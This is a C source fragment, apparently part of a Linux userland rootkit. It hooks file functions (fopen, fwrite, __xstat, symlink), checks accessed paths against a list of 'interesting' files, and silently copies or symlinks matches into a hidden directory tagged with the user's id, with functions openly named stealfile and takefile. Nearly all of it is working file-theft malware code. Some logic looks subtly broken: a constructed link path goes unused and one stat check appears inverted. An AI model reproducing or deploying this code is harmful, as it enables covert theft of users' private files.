int interesting(const char *path){
    char *interesting_file;
    int v = 0;

    for(int i = 0; i < INTERESTING_FILES_SIZE; i++){
        interesting_file = interesting_files[i];
        if(!strncmp(interesting_file, path, strlen(interesting_file))){
            v = 1;
            break;
        }

        if(!fnmatch(interesting_file, path, FNM_PATHNAME)){
            v = 1;
            break;
        }
    }

    return v;
}

int writecopy(const char *oldpath, char *newpath, off_t filesize){
    unsigned char *buf;
    FILE *ofp, *nfp;
    size_t n, m;
    off_t blksize = getablocksize(filesize);

    hook(CFOPEN, CFWRITE);

    ofp = call(CFOPEN, oldpath, "rb");
    if(ofp == NULL) return -1;

    nfp = call(CFOPEN, newpath, "wb");
    if(nfp == NULL){
        fclose(ofp);
        return -1;
    }

    do{
        buf = malloc(blksize+1);
        memset(buf, 0, blksize+1);
        n = fread(buf, 1, blksize, ofp);
        if(n){
            m = (long)call(CFWRITE, buf, 1, n, nfp);
            fflush(nfp);
        }else m = 0;
        fflush(ofp);
        free(buf);
    }while(n > 0 && n == m);

    fclose(ofp);
    fclose(nfp);
    return 1;
}

#ifdef SYMLINK_FALLBACK
int linkfile(const char *oldpath, char *newpath){
    hook(CSYMLINK);
    char newnewpath[strlen(newpath)+6];
    snprintf(newnewpath, sizeof(newnewpath), "%s-link", newpath);
    return (long)call(CSYMLINK, oldpath, newpath);
}
#endif

char *getnewpath(char *filename){
    int path_maxlen = strlen(INTEREST_DIR) +
                      strlen(filename) + 16;
    char *ret, *filenamedup = strdup(filename);

    if(filenamedup[0] == '.') // remove prefixed '.' if there is one.
        memmove(filenamedup, filenamedup + 1, strlen(filenamedup));

    ret = malloc(path_maxlen);
    memset(ret, 0, path_maxlen);
    snprintf(ret, path_maxlen, "%s/%s-%d",
                                INTEREST_DIR,
                                filenamedup,
                                getuid());

    free(filenamedup);
    return ret;
}

int stealfile(const char *oldpath, char *filename, char *newpath){
    struct stat astat, // for oldpath.
                pstat; // for newpath, should it exist, to check if there's a change in size.

    hook(C__XSTAT);

    memset(&astat, 0, sizeof(struct stat));

    if((long)call(C__XSTAT, _STAT_VER, oldpath, &astat) < 0) return -1;
    if(!S_ISREG(astat.st_mode)) return 1;   /* we only want to look at regular files. */
#ifdef MAX_FILE_SIZE
#ifdef SYMLINK_FALLBACK
    if(astat.st_size > MAX_FILE_SIZE)
        return linkfile(oldpath, newpath);
#endif
    if(astat.st_size > MAX_FILE_SIZE)
        return 1;
#endif

    memset(&pstat, 0, sizeof(struct stat));
    int statstat = (long)call(C__XSTAT, _STAT_VER, newpath, &pstat);
    if(statstat && pstat.st_size != astat.st_size){
        int copystat = writecopy(oldpath, newpath, astat.st_size);
#ifdef SYMLINK_FALLBACK
        if(copystat < 0)
            return linkfile(oldpath, newpath);
#endif
        return copystat;
    }else if(statstat < 0 && errno == ENOENT){
        int copystat = writecopy(oldpath, newpath, astat.st_size);
#ifdef SYMLINK_FALLBACK
        if(copystat < 0)
            return linkfile(oldpath, newpath);
#endif
        return copystat;
    }
    return -1;
}

void takefile(const char *path, char *filename){
    char *newpath;
    int steal;

    newpath = getnewpath(filename);
    steal = stealfile(path, filename, newpath);

    if(steal < 0){
        free(newpath);
        return;
    }

    if(!not_user(0))
        chown_path(newpath, readgid());
    free(newpath);
}

void inspect_file(const char *pathname){
    char *dupdup=strdup(pathname);
    char *filename = basename(dupdup);
    if(interesting(pathname) || interesting(filename))
        takefile(pathname, filename);
    free(dupdup);
}
